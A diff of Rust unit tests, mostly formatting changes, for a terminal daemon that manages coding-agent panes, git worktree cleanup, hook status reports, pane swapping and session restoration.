     d.made_worktrees.push(busy.clone());
     let tops = d.worktrees_of(&[t]);
     d.close_term(t);
     d.cleanup_worktrees(0, tops);
-    assert!(busy.is_dir(), "closing one pane must not delete a worktree while its sibling is still starting");
-    assert!(d.terms.contains_key(&sibling), "the sibling pane remains alive");
+    assert!(
+        busy.is_dir(),
+        "closing one pane must not delete a worktree while its sibling is still starting"
+    );
+    assert!(
+        d.terms.contains_key(&sibling),
+        "the sibling pane remains alive"
+    );
     close(&mut d, &[sibling]);
     let _ = std::fs::remove_dir_all(&root);
 }
@@ -514,8 +915,16 @@ fn auto_removal(d: &mut Daemon, rx: &mut mpsc::Receiver<Ev>) -> Removal {
     let until = Instant::now() + Duration::from_secs(60);
     while Instant::now() < until {
         match rx.try_recv() {
-            Ok(Ev::WorktreeAutoRemoved { client, path, result }) => {
-                d.handle(Ev::WorktreeAutoRemoved { client, path, result: result.clone() });
+            Ok(Ev::WorktreeAutoRemoved {
+                client,
+                path,
+                result,
+            }) => {
+                d.handle(Ev::WorktreeAutoRemoved {
+                    client,
+                    path,
+                    result: result.clone(),
+                });
                 return result;
             }
             Ok(ev) => d.handle(ev),
@@ -527,8 +936,15 @@ fn auto_removal(d: &mut Daemon, rx: &mut mpsc::Receiver<Ev>) -> Removal {
 
 /// A repo with `merged` (cut from main, nothing of its own) and `mine` (a commit only there),
 /// each with a workspace the app made.
-fn repo_with_two_made_worktrees(d: &mut Daemon, name: &str) -> (std::path::PathBuf, std::path::PathBuf, std::path::PathBuf) {
-    let root = std::env::temp_dir().join(format!(concat!(env!("APP_COMMAND"), "-{}-{}"), name, std::process::id()));
+fn repo_with_two_made_worktrees(
+    d: &mut Daemon,
+    name: &str,
+) -> (std::path::PathBuf, std::path::PathBuf, std::path::PathBuf) {
+    let root = std::env::temp_dir().join(format!(
+        concat!(env!("APP_COMMAND"), "-{}-{}"),
+        name,
+        std::process::id()
+    ));
     let _ = std::fs::remove_dir_all(&root);
     let repo = root.join("repo");
     std::fs::create_dir_all(&repo).unwrap();
@@ -540,13 +956,41 @@ fn repo_with_two_made_worktrees(d: &mut Daemon, name: &str) -> (std::path::PathB
     git(&repo, &["add", "."]);
     git(&repo, &["commit", "-qm", "one"]);
     let (merged, mine) = (root.join("merged"), root.join("mine"));
-    git(&repo, &["worktree", "add", "-q", "-b", "merged", merged.to_str().unwrap()]);
-    git(&repo, &["worktree", "add", "-q", "-b", "mine", mine.to_str().unwrap()]);
+    git(
+        &repo,
+        &[
+            "worktree",
+            "add",
+            "-q",
+            "-b",
+            "merged",
+            merged.to_str().unwrap(),
+        ],
+    );
+    git(
+        &repo,
+        &[
+            "worktree",
+            "add",
+            "-q",
+            "-b",
+            "mine",
+            mine.to_str().unwrap(),
+        ],
+    );
     std::fs::write(mine.join("b.ts"), "b").unwrap();
     git(&mine, &["add", "."]);
     git(&mine, &["commit", "-qm", "only here"]);
     for wt in [&merged, &mine] {
-        d.command(0, Command::NewWorkspace { cwd: Some(wt.clone()), name: None, cmd: None }).unwrap();
+        d.command(
+            0,
+            Command::NewWorkspace {
+                cwd: Some(wt.clone()),
+                name: None,
+                cmd: None,
+            },
+        )
+        .unwrap();
         d.made_worktrees.push(wt.clone());
     }
     (root, merged, mine)
@@ -557,28 +1001,62 @@ fn closing_a_worktrees_last_pane_removes_it_only_when_nothing_lives_only_there()
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
     let (root, merged, mine) = repo_with_two_made_worktrees(&mut d, "close-last");
-    let last_pane = |d: &Daemon, wt: &std::path::Path| d.terms.values().find(|t| same_path(&t.cwd, wt)).map(|t| t.id).expect("a pane there");
+    let last_pane = |d: &Daemon, wt: &std::path::Path| {
+        d.terms
+            .values()
+            .find(|t| same_path(&t.cwd, wt))
+            .map(|t| t.id)
+            .expect("a pane there")
+    };
 
     let t = last_pane(&d, &mine);
     d.command(0, Command::ClosePane { term: t }).unwrap();
     let asked = auto_removal(&mut d, &mut rx);
-    assert!(matches!(&asked, Removal::Unmerged(why) if why.contains("not merged anywhere")), "a commit only there is offered, got: {asked:?}");
+    assert!(
+        matches!(&asked, Removal::Unmerged(why) if why.contains("not merged anywhere")),
+        "a commit only there is offered, got: {asked:?}"
+    );
     assert!(mine.is_dir(), "and its folder stands until you say");
 
     let dirty = root.join("dirty");
-    crate::proc::git(&root.join("repo"), &["worktree", "add", "-q", "-b", "dirty", dirty.to_str().unwrap()]).unwrap();
+    crate::proc::git(
+        &root.join("repo"),
+        &[
+            "worktree",
+            "add",
+            "-q",
+            "-b",
+            "dirty",
+            dirty.to_str().unwrap(),
+        ],
+    )
+    .unwrap();
     std::fs::write(dirty.join("wip.ts"), "w").unwrap();
-    d.command(0, Command::NewWorkspace { cwd: Some(dirty.clone()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(dirty.clone()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     d.made_worktrees.push(dirty.clone());
     let t = last_pane(&d, &dirty);
     d.command(0, Command::ClosePane { term: t }).unwrap();
     let kept = auto_removal(&mut d, &mut rx);
-    assert!(matches!(&kept, Removal::Kept(why) if why.contains("uncommitted")) && dirty.is_dir(), "uncommitted work stays, got: {kept:?}");
+    assert!(
+        matches!(&kept, Removal::Kept(why) if why.contains("uncommitted")) && dirty.is_dir(),
+        "uncommitted work stays, got: {kept:?}"
+    );
 
     let t = last_pane(&d, &merged);
     d.command(0, Command::ClosePane { term: t }).unwrap();
     let gone = auto_removal(&mut d, &mut rx);
-    assert!(matches!(gone, Removal::Removed { .. }) && !merged.is_dir(), "a merged, clean one goes, got: {gone:?}");
+    assert!(
+        matches!(gone, Removal::Removed { .. }) && !merged.is_dir(),
+        "a merged, clean one goes, got: {gone:?}"
+    );
     let _ = std::fs::remove_dir_all(&root);
 }
 
@@ -588,19 +1066,44 @@ fn nothing_removes_a_worktree_on_its_own_while_no_pane_is_closed() {
     let _in_rt = rt.enter();
     let (root, merged, mine) = repo_with_two_made_worktrees(&mut d, "idle");
     // A tab and a split beside the first pane: closing either leaves the worktree in use.
-    let ws = d.workspaces.iter().find(|w| same_path(&w.cwd, &merged)).map(|w| w.id).unwrap();
-    d.command(0, Command::NewTab { ws, name: None, cmd: None }).unwrap();
+    let ws = d
+        .workspaces
+        .iter()
+        .find(|w| same_path(&w.cwd, &merged))
+        .map(|w| w.id)
+        .unwrap();
+    d.command(
+        0,
+        Command::NewTab {
+            ws,
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let tab = d.workspaces.iter().find(|w| w.id == ws).unwrap().active_tab;
     d.command(0, Command::CloseTab { ws, tab }).unwrap();
     let first = d.workspaces.iter().find(|w| w.id == ws).unwrap().tabs[0].focus;
-    d.command(0, Command::Split { term: first, dir: crate::layout::Dir::Right, cmd: None, cwd: None }).unwrap();
+    d.command(
+        0,
+        Command::Split {
+            term: first,
+            dir: crate::layout::Dir::Right,
+            cmd: None,
+            cwd: None,
+        },
+    )
+    .unwrap();
     let split = d.workspaces.iter().find(|w| w.id == ws).unwrap().tabs[0].focus;
     d.command(0, Command::ClosePane { term: split }).unwrap();
     // The checks that used to run on a timer only forget folders that are gone.
     d.forget_vanished_worktrees();
     std::thread::sleep(Duration::from_millis(1500));
     while let Ok(ev) = rx.try_recv() {
-        assert!(!matches!(ev, Ev::WorktreeAutoRemoved { .. }), "no removal was asked for");
+        assert!(
+            !matches!(ev, Ev::WorktreeAutoRemoved { .. }),
+            "no removal was asked for"
+        );
         d.handle(ev);
     }
     assert!(merged.is_dir() && mine.is_dir(), "both folders stand");
@@ -612,18 +1115,40 @@ fn nothing_removes_a_worktree_on_its_own_while_no_pane_is_closed() {
 fn a_clean_up_says_what_went_and_what_stayed() {
     let note = super::tidied_note;
     assert_eq!(note(&[("a".into(), false)], &[]), "removed 1 worktree");
-    assert_eq!(note(&[("a".into(), true), ("b".into(), false), ("c".into(), true)], &[]), "removed 3 worktrees (2 merged branches went too)");
-    assert_eq!(note(&[("a".into(), true)], &[("rate".into(), "something is running in it".into())]), "removed 1 worktree (1 merged branch went too); kept rate: something is running in it");
+    assert_eq!(
+        note(
+            &[("a".into(), true), ("b".into(), false), ("c".into(), true)],
+            &[]
+        ),
+        "removed 3 worktrees (2 merged branches went too)"
+    );
+    assert_eq!(
+        note(
+            &[("a".into(), true)],
+            &[("rate".into(), "something is running in it".into())]
+        ),
+        "removed 1 worktree (1 merged branch went too); kept rate: something is running in it"
+    );
     assert_eq!(note(&[], &[]), "nothing to clean up");
 }
 
 #[test]
 fn a_finish_you_have_seen_is_not_announced_again() {
     let (mut d, _rx) = daemon();
-    d.command(0, Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let t = d.workspaces[0].tabs[0].focus;
     let secret = d.terms[&t].token.clone();
-    let say = |d: &mut Daemon, status, event: &str| d.apply_hook(report(t, &secret, 0, status, event), Some(true), Vec::new());
+    let say = |d: &mut Daemon, status, event: &str| {
+        d.apply_hook(report(t, &secret, 0, status, event), Some(true), Vec::new())
+    };
     say(&mut d, HookStatus::Working, "UserPromptSubmit");
     say(&mut d, HookStatus::Done, "Stop");
     assert_eq!(d.terms[&t].status, Status::Done);
@@ -654,7 +1179,8 @@ fn explicit_idle_screen_evidence_recovers_missed_turn_ends_across_agents() {
             p.agent = Some(agent.into());
             p.hooked = true;
             p.status = Status::Working;
-            p.subagents.push(("child-1".into(), "general-purpose".into()));
+            p.subagents
+                .push(("child-1".into(), "general-purpose".into()));
             p.subagent_activity.push(SubagentActivity {
                 id: "child-1".into(),
                 name: "general-purpose".into(),
@@ -679,7 +1205,10 @@ fn explicit_idle_screen_evidence_recovers_missed_turn_ends_across_agents() {
             Status::Done,
             "{agent}: explicit idle screen evidence ends a missed turn"
         );
-        assert!(d.terms[&t].subagents.is_empty(), "{agent}: clear stale child runners");
+        assert!(
+            d.terms[&t].subagents.is_empty(),
+            "{agent}: clear stale child runners"
+        );
         assert_eq!(
             d.terms[&t].subagent_activity[0].state,
             SubagentState::ConnectionLost,
@@ -712,7 +1241,11 @@ fn a_hooked_claude_still_animating_is_not_read_idle_from_its_prompt_box() {
         p.last_output = Instant::now();
     }
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "its spinner still redraws: wait for the hook");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "its spinner still redraws: wait for the hook"
+    );
     assert!(d.terms[&t].alert_due.is_none(), "nothing rings yet");
     // No turn-end report ever came and the screen has gone still: the missed hook is recovered.
     d.terms.get_mut(&t).unwrap().last_output = Instant::now() - Duration::from_secs(10);
@@ -726,17 +1259,40 @@ fn a_permission_ask_settled_without_you_stops_needing_you() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
     let secret = d.terms[&t].token.clone();
-    d.apply_hook(report(t, &secret, 0, HookStatus::Blocked, "Notification:permission_prompt"), None, Vec::new());
+    d.apply_hook(
+        report(
+            t,
+            &secret,
+            0,
+            HookStatus::Blocked,
+            "Notification:permission_prompt",
+        ),
+        None,
+        Vec::new(),
+    );
     assert_eq!(d.terms[&t].status, Status::Blocked);
-    let long_ago = Instant::now() - super::status::UNASKED_QUESTION_GONE_AFTER - Duration::from_secs(1);
+    let long_ago =
+        Instant::now() - super::status::UNASKED_QUESTION_GONE_AFTER - Duration::from_secs(1);
     // The question still on screen: it still needs you.
-    d.terms.get_mut(&t).unwrap().parser.process(&b"\r\n".repeat(30));
-    d.terms.get_mut(&t).unwrap().parser.process(b"\r\n Do you want to proceed?\r\n \xe2\x9d\xaf 1. Yes\r\n   2. No\r\n");
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .parser
+        .process(&b"\r\n".repeat(30));
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .parser
+        .process(b"\r\n Do you want to proceed?\r\n \xe2\x9d\xaf 1. Yes\r\n   2. No\r\n");
     d.terms.get_mut(&t).unwrap().blocked_at = Some(long_ago);
     d.update_statuses();
     assert_eq!(d.terms[&t].status, Status::Blocked, "asking on screen");
     // Auto mode allowed it and the screen moved on, with no hook to say so: over.
-    d.terms.get_mut(&t).unwrap().parser.process(b"\x1b[2J\x1b[H* Waiting for 1 dynamic workflow to finish\r\n");
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .parser
+        .process(b"\x1b[2J\x1b[H* Waiting for 1 dynamic workflow to finish\r\n");
     d.update_statuses();
     assert_eq!(d.terms[&t].status, Status::Done, "nothing asked on screen");
     close(&mut d, &[t]);
@@ -747,33 +1303,67 @@ fn status_reports_apply_in_the_order_they_came() {
     let (mut d, mut rx) = daemon();
     let t = pane(&mut d);
     let secret = d.terms[&t].token.clone();
-    d.message(0, report(t, &secret, 0, HookStatus::Working, "UserPromptSubmit"));
+    d.message(
+        0,
+        report(t, &secret, 0, HookStatus::Working, "UserPromptSubmit"),
+    );
     d.message(0, report(t, &secret, 0, HookStatus::Blocked, "PreToolUse"));
     d.message(0, report(t, &secret, 0, HookStatus::Done, "Stop"));
     assert_eq!(settle(&mut d, &mut rx, 3), 3);
-    assert_eq!(d.terms[&t].status, Status::Done, "the last report wins: done (no one is looking)");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Done,
+        "the last report wins: done (no one is looking)"
+    );
     close(&mut d, &[t]);
 }
 
 #[test]
 fn waking_a_sleeping_session_keeps_what_you_called_it() {
     let (mut d, _rx) = daemon();
-    d.command(0, Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let old = d.workspaces[0].tabs[0].focus;
-    d.command(0, Command::RenamePane { term: old, name: "The Planner".into() }).unwrap();
+    d.command(
+        0,
+        Command::RenamePane {
+            term: old,
+            name: "The Planner".into(),
+        },
+    )
+    .unwrap();
     let t = d.terms.get_mut(&old).unwrap();
     (t.name, t.model, t.asleep) = ("roadmap".into(), "opus".into(), true);
     t.kill_tree();
     let new = d.wake(old).expect("it wakes");
-    assert!(new != old && !d.terms.contains_key(&old), "a new process in its place");
+    assert!(
+        new != old && !d.terms.contains_key(&old),
+        "a new process in its place"
+    );
     let t = &d.terms[&new];
-    assert_eq!((t.label.as_str(), t.name.as_str(), t.model.as_str()), ("The Planner", "roadmap", "opus"), "the same session to you");
+    assert_eq!(
+        (t.label.as_str(), t.name.as_str(), t.model.as_str()),
+        ("The Planner", "roadmap", "opus"),
+        "the same session to you"
+    );
     assert_eq!(d.workspaces[0].tabs[0].focus, new, "in the same spot");
     close(&mut d, &[new]);
 }
 
 /// A connection acting from `term`, as its agent's `<app>` commands do.
-fn from_pane(d: &mut Daemon, client: ClientId, term: TermId, token: &str) -> mpsc::Receiver<ServerMsg> {
+fn from_pane(
+    d: &mut Daemon,
+    client: ClientId,
+    term: TermId,
+    token: &str,
+) -> mpsc::Receiver<ServerMsg> {
     let (tx, rx) = mpsc::channel(64);
     d.handle(Ev::Connected(client, tx, false));
     d.handle(Ev::From(client, term, token.into()));
@@ -788,24 +1378,62 @@ fn newest(d: &Daemon) -> TermId {
 fn a_session_knows_which_pane_started_it() {
     let (mut d, _rx) = daemon();
     let here = Some(std::env::temp_dir());
-    d.command(0, Command::NewWorkspace { cwd: here.clone(), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: here.clone(),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let starter = d.workspaces[0].tabs[0].focus;
     assert_eq!(d.terms[&starter].started_by, None, "you started it");
     let token = d.terms[&starter].token.clone();
     let _c = from_pane(&mut d, 1, starter, &token);
     let mut made = vec![starter];
-    d.handle(Ev::Msg(1, ClientMsg::Command(Command::NewWorkspace { cwd: here.clone(), name: None, cmd: None })));
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Command(Command::NewWorkspace {
+            cwd: here.clone(),
+            name: None,
+            cmd: None,
+        }),
+    ));
     made.push(newest(&d));
     let ws = d.workspaces[0].id;
-    d.handle(Ev::Msg(1, ClientMsg::Command(Command::NewTab { ws, name: None, cmd: None })));
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Command(Command::NewTab {
+            ws,
+            name: None,
+            cmd: None,
+        }),
+    ));
     made.push(newest(&d));
-    d.handle(Ev::Msg(1, ClientMsg::Command(Command::Split { term: starter, dir: crate::layout::Dir::Right, cmd: None, cwd: None })));
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Command(Command::Split {
+            term: starter,
+            dir: crate::layout::Dir::Right,
+            cmd: None,
+            cwd: None,
+        }),
+    ));
     made.push(newest(&d));
     assert_eq!(made.len(), 4, "a workspace, a tab and a split");
     for t in &made[1..] {
-        assert_eq!(d.terms[t].started_by, Some(starter), "started from the starter's pane");
+        assert_eq!(
+            d.terms[t].started_by,
+            Some(starter),
+            "started from the starter's pane"
+        );
     }
-    assert_eq!(d.snapshot().terms[&made[1]].started_by, Some(starter), "and clients are told");
+    assert_eq!(
+        d.snapshot().terms[&made[1]].started_by,
+        Some(starter),
+        "and clients are told"
+    );
     close(&mut d, &made);
 }
 
@@ -814,10 +1442,20 @@ fn only_the_pane_itself_can_be_named_as_the_starter() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
     let _c = from_pane(&mut d, 1, t, "not-the-secret");
-    d.handle(Ev::Msg(1, ClientMsg::Command(Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None })));
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Command(Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        }),
+    ));
     let new = newest(&d);
     assert!(new != t, "it may still start a session");
-    assert_eq!(d.terms[&new].started_by, None, "but not in that pane's name");
+    assert_eq!(
+        d.terms[&new].started_by, None,
+        "but not in that pane's name"
+    );
     close(&mut d, &[t, new]);
 }
 
@@ -825,15 +1463,34 @@ fn only_the_pane_itself_can_be_named_as_the_starter() {
 fn a_worktree_start_keeps_its_starter_after_the_caller_has_gone() {
     let (mut d, _rx) = daemon();
     let starter = pane(&mut d);
-    let dir = std::env::temp_dir().join(format!(concat!(env!("APP_COMMAND"), "-started-by-{}"), std::process::id()));
+    let dir = std::env::temp_dir().join(format!(
+        concat!(env!("APP_COMMAND"), "-started-by-{}"),
+        std::process::id()
+    ));
     std::fs::create_dir_all(&dir).unwrap();
     // The worktree was asked for from the starter's pane; that connection closed while git ran.
     d.pending_ops += 1;
-    d.handle(Ev::WorktreeCreated { client: 9, branch: "helper".into(), cmd: None, split: None, by: Some(starter), set_up: false, result: Ok((dir.clone(), String::new())) });
+    d.handle(Ev::WorktreeCreated {
+        client: 9,
+        branch: "helper".into(),
+        cmd: None,
+        split: None,
+        by: Some(starter),
+        set_up: false,
+        result: Ok((dir.clone(), String::new())),
+    });
     let helper = newest(&d);
     assert_eq!(d.terms[&helper].started_by, Some(starter));
     // The next session you start yourself isn't the starter's.
-    d.command(0, Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let yours = newest(&d);
     assert_eq!(d.terms[&yours].started_by, None);
     close(&mut d, &[starter, helper, yours]);
@@ -845,7 +1502,15 @@ fn a_replaced_session_keeps_its_place_among_its_helpers() {
     let (mut d, _rx) = daemon();
     let here = Some(std::env::temp_dir());
     for _ in 0..3 {
-        d.command(0, Command::NewWorkspace { cwd: here.clone(), name: None, cmd: None }).unwrap();
+        d.command(
+            0,
+            Command::NewWorkspace {
+                cwd: here.clone(),
+                name: None,
+                cmd: None,
+            },
+        )
+        .unwrap();
     }
     let [lead, starter, helper] = [0, 1, 2].map(|i| d.workspaces[i].tabs[0].focus);
     d.terms.get_mut(&starter).unwrap().started_by = Some(lead);
@@ -855,8 +1520,16 @@ fn a_replaced_session_keeps_its_place_among_its_helpers() {
     t.asleep = true;
     t.kill_tree();
     let woken = d.wake(starter).expect("it wakes");
-    assert_eq!(d.terms[&woken].started_by, Some(lead), "still under the one that started it");
-    assert_eq!(d.terms[&helper].started_by, Some(woken), "and its helper is still its own");
+    assert_eq!(
+        d.terms[&woken].started_by,
+        Some(lead),
+        "still under the one that started it"
+    );
+    assert_eq!(
+        d.terms[&helper].started_by,
+        Some(woken),
+        "and its helper is still its own"
+    );
     // Moved into a worktree: the same again.
     d.relocate(woken, &std::env::temp_dir());
     let moved = d.workspaces[1].tabs[0].focus;
@@ -870,10 +1543,27 @@ fn a_replaced_session_keeps_its_place_among_its_helpers() {
 fn detaching_and_closing_prune_tabs_and_workspaces() {
     let (mut d, _rx) = daemon();
     let dir = std::env::temp_dir();
-    d.command(0, Command::NewWorkspace { cwd: Some(dir.clone()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(dir.clone()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     assert_eq!(d.workspaces.len(), 1);
     let first = d.workspaces[0].tabs[0].focus;
-    d.command(0, Command::Split { term: first, dir: crate::layout::Dir::Right, cmd: None, cwd: None }).unwrap();
+    d.command(
+        0,
+        Command::Split {
+            term: first,
+            dir: crate::layout::Dir::Right,
+            cmd: None,
+            cwd: None,
+        },
+    )
+    .unwrap();
     let leaves = d.workspaces[0].tabs[0].layout.leaves();
     assert_eq!(leaves.len(), 2);
     let second = leaves.into_iter().find(|t| *t != first).unwrap();
@@ -881,7 +1571,10 @@ fn detaching_and_closing_prune_tabs_and_workspaces() {
     d.detach(first);
     assert!(d.terms.contains_key(&first), "detach keeps the terminal");
     assert_eq!(d.workspaces[0].tabs[0].layout.leaves(), vec![second]);
-    assert_eq!(d.workspaces[0].tabs[0].focus, second, "focus moves to what's left");
+    assert_eq!(
+        d.workspaces[0].tabs[0].focus, second,
+        "focus moves to what's left"
+    );
     // The last pane goes: the tab and the workspace go with it.
     d.remove_term(second);
     assert!(d.workspaces.is_empty(), "an emptied workspace disappears");
@@ -892,21 +1585,57 @@ fn detaching_and_closing_prune_tabs_and_workspaces() {
 #[test]
 fn swapped_panes_trade_places_and_come_back_swapped_after_a_restart() {
     let (mut d, _rx) = daemon();
-    d.command(0, Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let left = d.workspaces[0].tabs[0].focus;
-    d.command(0, Command::Split { term: left, dir: crate::layout::Dir::Right, cmd: None, cwd: None }).unwrap();
+    d.command(
+        0,
+        Command::Split {
+            term: left,
+            dir: crate::layout::Dir::Right,
+            cmd: None,
+            cwd: None,
+        },
+    )
+    .unwrap();
     let right = newest(&d);
-    d.command(0, Command::RenamePane { term: left, name: "was left".into() }).unwrap();
-    d.command(0, Command::RenamePane { term: right, name: "was right".into() }).unwrap();
+    d.command(
+        0,
+        Command::RenamePane {
+            term: left,
+            name: "was left".into(),
+        },
+    )
+    .unwrap();
+    d.command(
+        0,
+        Command::RenamePane {
+            term: right,
+            name: "was right".into(),
+        },
+    )
+    .unwrap();
 
-    d.command(0, Command::SwapPanes { a: left, b: right }).unwrap();
+    d.command(0, Command::SwapPanes { a: left, b: right })
+        .unwrap();
     assert_eq!(d.workspaces[0].tabs[0].layout.leaves(), vec![right, left]);
 
     let (mut d2, _rx2) = daemon();
     d2.restore(d.saved());
     let back = d2.workspaces[0].tabs[0].layout.leaves();
     let labels: Vec<&str> = back.iter().map(|t| d2.terms[t].label.as_str()).collect();
-    assert_eq!(labels, ["was right", "was left"], "the swapped order is what's saved");
+    assert_eq!(
+        labels,
+        ["was right", "was left"],
+        "the swapped order is what's saved"
+    );
     close(&mut d2, &back);
     close(&mut d, &[left, right]);
 }
@@ -914,16 +1643,49 @@ fn swapped_panes_trade_places_and_come_back_swapped_after_a_restart() {
 #[test]
 fn panes_in_different_tabs_cannot_swap() {
     let (mut d, _rx) = daemon();
-    d.command(0, Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let first = d.workspaces[0].tabs[0].focus;
     let ws = d.workspaces[0].id;
-    d.command(0, Command::NewTab { ws, name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewTab {
+            ws,
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let other = newest(&d);
-    let before: Vec<_> = d.workspaces[0].tabs.iter().map(|t| t.layout.clone()).collect();
-    let err = d.command(0, Command::SwapPanes { a: first, b: other }).unwrap_err();
+    let before: Vec<_> = d.workspaces[0]
+        .tabs
+        .iter()
+        .map(|t| t.layout.clone())
+        .collect();
+    let err = d
+        .command(0, Command::SwapPanes { a: first, b: other })
+        .unwrap_err();
     assert!(err.to_string().contains("same tab"), "{err}");
-    assert!(d.command(0, Command::SwapPanes { a: first, b: 9999 }).is_err(), "a pane that isn't there");
-    assert_eq!(d.workspaces[0].tabs.iter().map(|t| t.layout.clone()).collect::<Vec<_>>(), before);
+    assert!(
+        d.command(0, Command::SwapPanes { a: first, b: 9999 })
+            .is_err(),
+        "a pane that isn't there"
+    );
+    assert_eq!(
+        d.workspaces[0]
+            .tabs
+            .iter()
+            .map(|t| t.layout.clone())
+            .collect::<Vec<_>>(),
+        before
+    );
     close(&mut d, &[first, other]);
 }
 
@@ -934,12 +1696,28 @@ fn a_spare_fits_only_its_repo_and_its_agent() {
     let repo = std::env::temp_dir().join(concat!(env!("APP_COMMAND"), "-spare-repo"));
     d.cfg.worktree.prewarm = "claude".into();
     d.spare = Some((repo.clone(), repo.join("wt"), t));
-    assert_eq!(d.spare_fits(&repo, "claude").as_deref(), Some(""), "the agent alone");
+    assert_eq!(
+        d.spare_fits(&repo, "claude").as_deref(),
+        Some(""),
+        "the agent alone"
+    );
     let with_task = format!("claude {}", d.cfg.quote_for_shell("fix the flaky test"));
-    assert_eq!(d.spare_fits(&repo, &with_task).as_deref(), Some("fix the flaky test"), "the agent and a task");
+    assert_eq!(
+        d.spare_fits(&repo, &with_task).as_deref(),
+        Some("fix the flaky test"),
+        "the agent and a task"
+    );
     assert_eq!(d.spare_fits(&repo, "codex"), None, "another agent");
-    assert_eq!(d.spare_fits(&repo, "claude --model opus"), None, "other options");
-    assert_eq!(d.spare_fits(&std::env::temp_dir().join("other"), "claude"), None, "another repo");
+    assert_eq!(
+        d.spare_fits(&repo, "claude --model opus"),
+        None,
+        "other options"
+    );
+    assert_eq!(
+        d.spare_fits(&std::env::temp_dir().join("other"), "claude"),
+        None,
+        "another repo"
+    );
     d.cfg.worktree.prewarm.clear();
     assert_eq!(d.spare_fits(&repo, "claude"), None, "prewarming off");
     d.spare = None;
@@ -988,37 +1766,106 @@ fn helpers_and_tabs_come_back_from_a_restart_under_their_session() {
             name: String::new(),
             layout: Node::Leaf(id),
             focus: id,
-            panes: [(id, persist::SavedPane { cwd: Some(dir.clone()), started_by: by, tab_of: by.filter(|_| id == 71), subagent_activity: if id == 71 { vec![child_activity.clone(), active_activity.clone()] } else { Vec::new() }, ..Default::default() })].into(),
+            panes: [(
+                id,
+                persist::SavedPane {
+                    cwd: Some(dir.clone()),
+                    started_by: by,
+                    tab_of: by.filter(|_| id == 71),
+                    subagent_activity: if id == 71 {
+                        vec![child_activity.clone(), active_activity.clone()]
+                    } else {
+                        Vec::new()
+                    },
+                    ..Default::default()
+                },
+            )]
+            .into(),
         }],
         active_tab: 0,
     };
-    d.restore(persist::Saved { workspaces: vec![ws(71, Some(70)), ws(72, Some(99)), ws(70, None)], active: 0, made_worktrees: Vec::new() });
+    d.restore(persist::Saved {
+        workspaces: vec![ws(71, Some(70)), ws(72, Some(99)), ws(70, None)],
+        active: 0,
+        made_worktrees: Vec::new(),
+        conversations: Vec::new(),
+        pending_starts: Vec::new(),
+        conversation_operations: Vec::new(),
+    });
     let [helper, orphan, starter] = [0, 1, 2].map(|i| d.workspaces[i].tabs[0].focus);
     assert!(starter != 70, "the starter has this run's id");
-    assert_eq!(d.terms[&helper].started_by, Some(starter), "its helper found it again");
-    assert_eq!(d.terms[&helper].subagent_activity[0], child_activity, "completed child and result survive restoration");
+    assert_eq!(
+        d.terms[&helper].started_by,
+        Some(starter),
+        "its helper found it again"
+    );
+    assert_eq!(
+        d.terms[&helper].subagent_activity[0], child_activity,
+        "completed child and result survive restoration"
+    );
     assert_eq!(d.terms[&helper].subagent_activity[1].id, active_activity.id);
-    assert_eq!(d.terms[&helper].subagent_activity[1].state, SubagentState::ConnectionLost, "active child is unconfirmed after a daemon restart");
-    assert_eq!(d.terms[&orphan].started_by, None, "a helper whose starter didn't come back is on its own");
+    assert_eq!(
+        d.terms[&helper].subagent_activity[1].state,
+        SubagentState::ConnectionLost,
+        "active child is unconfirmed after a daemon restart"
+    );
+    assert_eq!(
+        d.terms[&orphan].started_by, None,
+        "a helper whose starter didn't come back is on its own"
+    );
     assert_eq!(d.terms[&starter].started_by, None);
     // A pane in another session's tab comes back in that session's tab, by its new id.
-    assert_eq!(d.terms[&helper].tab_of, Some(starter), "71 was a tab of 70's: it is again");
-    assert_eq!((d.terms[&orphan].tab_of, d.terms[&starter].tab_of), (None, None), "the rest are their own");
